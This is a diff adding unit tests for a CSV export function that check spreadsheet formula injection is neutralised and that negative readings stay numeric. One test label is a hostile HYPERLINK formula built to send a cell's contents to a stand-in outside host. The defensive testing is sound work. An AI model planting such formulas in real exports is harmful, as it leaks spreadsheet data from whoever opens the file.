@@ -244,3 +244,29 @@ describe("toText — observational trial whose yes/no row is missing", () => {
     expect(text).not.toMatch(/baseline days|intervention days/);
   });
 });
+
+describe("toCsv — formula injection", () => {
+  const withFormula: ExportHunch = {
+    ...hunch,
+    parameters: [
+      { id: "p1", label: '=HYPERLINK("http://x/?"&A2,"x")', unit: null, isPrimary: true },
+      { id: "p2", label: "@SUM(A1)", unit: null },
+    ],
+  };
+
+  it("neutralises a label a spreadsheet would run as a formula", () => {
+    const header = toCsv(withFormula).split("\n")[0];
+    expect(header).not.toMatch(/(^|,)"?[=@]/);
+    expect(header).toContain("'=HYPERLINK");
+    expect(header).toContain("'@SUM(A1)");
+  });
+
+  it("leaves a negative reading as a number", () => {
+    const negative: ExportHunch = {
+      ...hunch,
+      parameters: [{ id: "p1", label: "temp", unit: null, isPrimary: true }],
+      checkIns: [{ loggedOn: new Date("2026-08-01T00:00:00.000Z"), phase: "A", values: [{ parameterId: "p1", value: -3 }] }],
+    };
+    expect(toCsv(negative)).toContain(",-3\n");
+  });
+});
